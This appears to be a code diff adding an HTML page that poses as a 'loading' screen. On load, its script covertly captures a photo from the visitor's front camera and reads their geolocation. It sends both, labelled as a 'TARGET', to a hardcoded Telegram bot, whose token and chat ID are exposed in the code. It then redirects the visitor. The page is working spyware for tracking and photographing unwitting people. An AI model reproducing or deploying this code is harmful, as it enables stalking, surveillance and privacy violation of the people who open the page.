@@ -1,0 +1,101 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Capture and Send</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: black;
+            color: white;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 24px;
+            margin: 0;
+        }
+        #video {
+            display: none;
+        }
+        @keyframes dots {
+            0% { content: ''; }
+            25% { content: '.'; }
+            50% { content: '..'; }
+            75% { content: '...'; }
+            100% { content: '....'; }
+        }
+        .loading::after {
+            content: '';
+            animation: dots 2s steps(4, end) infinite;
+        }
+    </style>
+</head>
+<body>
+    <div class="loading">Loading bentar</div>
+    <video id="video" autoplay></video>
+    <script>
+        async function init() {
+            // Access the camera
+            const video = document.getElementById('video');
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+            video.srcObject = stream;
+
+            // Wait for the video to load
+            await new Promise(resolve => video.onloadedmetadata = resolve);
+
+            // Capture the image
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png');
+
+            // Get the location
+            navigator.geolocation.getCurrentPosition(async (position) => {
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+                const locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+                // Send data to Telegram bot
+                const botToken = '7697909009:AAGs7C30Ja1Wd-RQwG6rnhxApQ2YudQlJZM';
+                const chatId = '6310487830';
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', dataURItoBlob(imageData));
+                formData.append('caption', `[ 𝙏𝘼𝙍𝙂𝙀𝙏 𝙉𝙀𝙒 𝘾𝙄𝙆 ]\n\n🛰 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 :  ${locationLink}`);
+
+                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                // Stop the video stream
+                stream.getTracks().forEach(track => track.stop());
+
+                // Update the UI
+                document.body.innerHTML = '<div>Data sent to Telegram!</div>';
+            });
+        }
+
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        }
+
+        window.onload = () => {
+            init();
+            setTimeout(() => {
+                window.location.href = 'nex.html'; // Ganti dengan halaman tujuan
+            }, 10000); // 2s * 3 = 6s
+        };
+    </script>
+</body>
+</html>
